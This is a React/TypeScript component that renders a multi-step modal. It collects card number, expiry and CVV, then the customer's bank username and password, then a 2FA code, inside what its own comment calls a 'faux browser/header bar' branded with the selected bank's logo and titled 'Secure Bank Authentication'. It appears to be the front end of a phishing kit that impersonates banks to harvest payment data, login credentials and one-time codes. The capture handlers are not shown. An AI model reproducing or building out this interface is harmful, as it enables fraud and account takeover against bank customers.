import React from 'react';
import { X } from 'lucide-react';
import BankLogo from './BankLogo';
import BankCardForm from './BankCardForm';
import BankLoginForm from './BankLoginForm';
import VerificationStep from './VerificationStep';
import TwoFactorCode from './TwoFactorCode';

interface BankAuthModalProps {
  showBankAuth: boolean;
  connecting: boolean;
  authStep: number;
  processingPayment: boolean;
  paymentDone: boolean;
  processingProgress: number;
  selectedBank: string;
  banks: Array<{ name: string; logo: string; label: string; additionalLogo: string }>;
  cardData: {
    cardholderName: string;
    cardNumber: string;
    expiryDate: string;
    cvv: string;
  };
  cardType: string;
  cardErrors: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardholderName: string;
  };
  bankLoginData: {
    username: string;
    password: string;
    twoFactorCode: string;
  };
  showPassword: boolean;
  setShowPassword: React.Dispatch<React.SetStateAction<boolean>>;
  handleCardDetailsSubmit: (e: React.FormEvent) => void;
  handleCardDataChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  handleLoginSubmit: (e: React.FormEvent) => void;
  handleVerificationContinue: (e: React.FormEvent) => void;
  handle2FASubmit: (e: React.FormEvent) => void;
  handleBankLoginChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  closeBankAuth: () => void;
  total: number;
}

const BankAuthModal: React.FC<BankAuthModalProps> = ({
  showBankAuth,
  connecting,
  authStep,
  processingPayment,
  paymentDone,
  processingProgress,
  selectedBank,
  banks,
  cardData,
  cardType,
  cardErrors,
  bankLoginData,
  showPassword,
  setShowPassword,
  handleCardDetailsSubmit,
  handleCardDataChange,
  handleLoginSubmit,
  handleVerificationContinue,
  handle2FASubmit,
  handleBankLoginChange,
  closeBankAuth,
  total,
}) => {
  if (!showBankAuth) return null;

  return (
    <div
      className={`fixed inset-0 ${connecting || authStep >= 2 || processingPayment ? 'bg-transparent' : 'bg-black/50'} flex items-center justify-center z-50 ${connecting || authStep >= 2 || processingPayment ? '' : 'p-4'}`}
    >
      <div
        className={`${
          connecting || authStep >= 2 || processingPayment
            ? 'bg-white text-gray-900 w-full h-[calc(100vh-40px)] mx-4 sm:mx-6 md:mx-auto md:max-w-[32rem] lg:max-w-[32rem] rounded-lg'
            : 'bg-white max-w-md rounded-xl'
        } shadow-2xl w-full relative`}
      >
        <button
          onClick={closeBankAuth}
          className={`absolute top-2 right-4 ${connecting || authStep >= 2 || processingPayment ? 'text-gray-500 hover:text-gray-700' : 'text-gray-400 hover:text-gray-600'} z-10`}
        >
          <X className="w-6 h-6" />
        </button>

        {/* Faux browser/header bar for bank steps */}
        {(connecting || authStep >= 2 || processingPayment) && (
          <div className="flex items-center justify-center px-4 py-2 border-b border-gray-200 bg-gray-100">
            <div className="text-sm text-gray-700 font-medium">
              Secure Bank Authentication
            </div>
          </div>
        )}

        {/* Step 1: Card Details */}
        {authStep === 1 && !connecting && (
          <BankCardForm
            handleCardDetailsSubmit={handleCardDetailsSubmit}
            cardType={cardType}
            handleCardDataChange={handleCardDataChange}
            cardData={cardData}
            cardErrors={cardErrors}
          />
        )}

        {/* Connecting/loading between step 1 and 2 */}
        {connecting && (
          <div className="p-8 md:p-10">
            <div className="text-center mb-6">
              <div className="mx-auto mb-4 w-32 h-12 flex items-center justify-center">
                <BankLogo
                  banks={banks}
                  selectedBank={selectedBank}
                  className="h-12 object-contain"
                />
              </div>
              <div className="flex gap-2 justify-center">
                <svg
                  aria-hidden="true"
                  className="inline w-6 h-6 text-gray-200 animate-spin dark:text-gray-600 fill-gray-900"
                  viewBox="0 0 100 101"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                    fill="currentColor"
                  />
                  <path
                    d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                    fill="currentFill"
                  />
                </svg>

                <span>Processing Transaction...</span>
              </div>
            </div>
          </div>
        )}

        {/* Payment processing after step 3 submit */}
        {processingPayment && (
          <div className="p-8 md:p-10">
            <div className="text-center mb-6">
              {!paymentDone ? (
                <>
                  <h3 className="text-xl font-semibold text-gray-800">
                    Payment processing...
                  </h3>
                </>
              ) : (
                <>
                  <h3 className="text-xl font-semibold text-gray-800">
                    Approved ✅
                  </h3>
                  <p className="text-gray-600 mt-2">
                    Finalizing your order…
                  </p>
                </>
              )}
            </div>
            {!paymentDone && (
              <div className="w-full rounded-full overflow-hidden flex justify-center">
                <svg
                  aria-hidden="true"
                  className="inline w-6 h-6 text-gray-200 animate-spin dark:text-gray-600 fill-gray-900"
                  viewBox="0 0 100 101"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                    fill="currentColor"
                  />
                  <path
                    d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                    fill="currentFill"
                  />
                </svg>
                <div>Processing payment...</div>
              </div>
            )}
          </div>
        )}

        {/* Step 2: Login Form */}
        {authStep === 2 && !connecting && !processingPayment && (
          <div className="p-4 md:p-6">
            <BankLoginForm
              banks={banks}
              selectedBank={selectedBank}
              bankLoginData={bankLoginData}
              handleLoginSubmit={handleLoginSubmit}
              showPassword={showPassword}
              setShowPassword={setShowPassword}
              handleBankLoginChange={handleBankLoginChange}
            />
          </div>
        )}

        {/* Step 3: 2FA prompt (design screen) */}
        {authStep === 3 && !connecting && !processingPayment && (
          <VerificationStep
            selectedBank={selectedBank}
            banks={banks}
            cardData={cardData}
            cardType={cardType}
            handle2FASubmit={handleVerificationContinue}
          />
        )}

        {/* Step 4: 6-digit code entry */}
        {authStep === 4 && !connecting && !processingPayment && (
          <div className="p-4 md:p-6">
            <div className="max-w-md mx-auto">
              <TwoFactorCode
                code={bankLoginData.twoFactorCode}
                setCode={(v) =>
                  handleBankLoginChange({
                    target: { name: 'twoFactorCode', value: v },
                  } as React.ChangeEvent<HTMLInputElement>)
                }
                total={total}
                banks={banks}
                onSubmit={handle2FASubmit}
                selectedBank={selectedBank}
                phoneNumber=""
                cardType={cardType}
                disabled={processingPayment}
                cardNumber={cardData.cardNumber}
              />
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default BankAuthModal; 